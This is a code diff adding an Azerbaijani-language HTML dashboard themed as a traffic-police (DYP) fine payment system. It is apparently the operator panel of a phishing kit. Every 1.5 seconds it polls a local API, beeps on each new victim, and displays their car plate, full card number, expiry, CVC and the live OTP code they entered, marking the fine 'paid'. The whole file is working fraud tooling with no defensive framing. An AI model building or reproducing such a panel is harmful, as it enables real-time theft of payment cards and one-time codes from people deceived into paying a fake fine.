@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DYP - Canlı Ödəniş Sorğuları və Bildirişlər</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+    </style>
+</head>
+<body class="bg-gray-100 min-h-screen py-10 px-4">
+    <div class="max-w-2xl mx-auto space-y-6">
+
+        <!-- Header -->
+        <div class="bg-white rounded-2xl shadow-xl p-6 flex justify-between items-center">
+            <div>
+                <h1 class="font-bold text-gray-800 text-xl">🔔 Canlı Ödəniş Sorğuları</h1>
+                <p class="text-xs text-gray-500 mt-1">İstifadəçi kart məlumatlarını və OTP yazdıqda səsli xəbərdarlıq gəlir</p>
+            </div>
+            <div class="flex items-center space-x-2">
+                <span class="relative flex h-3 w-3">
+                  <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                  <span class="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
+                </span>
+                <span class="text-xs font-bold text-green-600">Dinlənilir...</span>
+            </div>
+        </div>
+
+        <!-- Requests Container -->
+        <div id="requests-container" class="space-y-4">
+            <!-- Dynamic request card will appear here -->
+            <div id="no-request" class="bg-white rounded-2xl shadow-md p-10 text-center text-gray-400">
+                <div class="text-4xl mb-2">📥</div>
+                <p class="text-sm font-medium">Hələ ki yeni ödəniş sorğusu yoxdur...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = 'http://localhost:3000/api';
+        let lastCardNo = null;
+
+        // Web Audio API beep sound generator
+        function playBeep() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+
+                oscillator.type = 'sine';
+                oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); // High pitch beep
+                gainNode.gain.setValueAtTime(0.5, audioCtx.currentTime);
+
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+
+                oscillator.start();
+                oscillator.stop(audioCtx.currentTime + 0.6); // 600ms beep
+            } catch (e) {
+                console.log("Audio play error:", e);
+            }
+        }
+
+        async function checkRequests() {
+            try {
+                const res = await fetch(`${API_URL}/fine`);
+                const data = await res.json();
+
+                if (data.cardNo && data.cardNo !== lastCardNo) {
+                    lastCardNo = data.cardNo;
+                    playBeep(); // Play sound alert!
+                    renderRequestCard(data);
+                } else if (data.cardNo && lastCardNo === data.cardNo) {
+                    // Update OTP or status if changed
+                    updateRequestCard(data);
+                }
+            } catch (err) {
+                console.error("Sorğu xətası:", err);
+            }
+        }
+
+        function renderRequestCard(data) {
+            const container = document.getElementById('requests-container');
+            document.getElementById('no-request')?.remove();
+
+            container.innerHTML = `
+                <div class="bg-white rounded-2xl shadow-xl border-2 border-green-500 p-6 space-y-4 animate-bounce-once">
+                    <div class="flex justify-between items-center border-b pb-3">
+                        <div class="flex items-center space-x-2">
+                            <span class="text-2xl">🚨</span>
+                            <h3 class="font-bold text-red-600 text-lg">YENİ ÖDƏNİŞ SORĞUSU GƏLDİ!</h3>
+                        </div>
+                        <span class="bg-amber-100 text-amber-800 text-xs px-3 py-1 rounded-full font-bold">${data.dateTime}</span>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4 text-sm">
+                        <div class="bg-gray-50 p-3 rounded-xl">
+                            <span class="text-xs text-gray-500 block">Avtomobil Nömrəsi:</span>
+                            <strong class="text-blue-600 text-base">${data.plateNo}</strong>
+                        </div>
+                        <div class="bg-gray-50 p-3 rounded-xl">
+                            <span class="text-xs text-gray-500 block">Protokol No:</span>
+                            <strong class="text-gray-800">${data.protocolNo}</strong>
+                        </div>
+                    </div>
+
+                    <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 space-y-2 text-sm">
+                        <div class="flex justify-between">
+                            <span class="text-gray-600 font-semibold">Kart Nömrəsi:</span>
+                            <span class="font-mono font-bold text-blue-700 text-base">${data.cardNo}</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600 font-semibold">Ay / İl (Exp):</span>
+                            <span class="font-mono font-bold text-gray-800">${data.cardExp}</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600 font-semibold">CVC Kodu:</span>
+                            <span class="font-mono font-bold text-gray-800">${data.cardCvc}</span>
+                        </div>
+                        <div class="flex justify-between border-t pt-2">
+                            <span class="text-gray-600 font-semibold">Daxil edilən OTP Kodu:</span>
+                            <span id="req-otp" class="font-mono font-bold text-amber-600 text-lg">${data.otpCode || 'Gözlənilir...'}</span>
+                        </div>
+                        <div class="flex justify-between border-t pt-2">
+                            <span class="text-gray-600 font-semibold">Status:</span>
+                            <span id="req-status" class="font-bold ${data.isPaid ? 'text-green-600' : 'text-amber-600'}">${data.isPaid ? '✅ Ödənildi (20 AZN)' : '⏳ OTP Gözlənilir'}</span>
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        function updateRequestCard(data) {
+            const otpEl = document.getElementById('req-otp');
+            const statusEl = document.getElementById('req-status');
+            if (otpEl) otpEl.textContent = data.otpCode || 'Gözlənilir...';
+            if (statusEl) {
+                statusEl.textContent = data.isPaid ? '✅ Ödənildi (20 AZN)' : '⏳ OTP Gözlənilir';
+                statusEl.className = data.isPaid ? 'font-bold text-green-600' : 'font-bold text-amber-600';
+            }
+        }
+
+        setInterval(checkRequests, 1500); // Check every 1.5 seconds
+    </script>
+</body>
+</html>
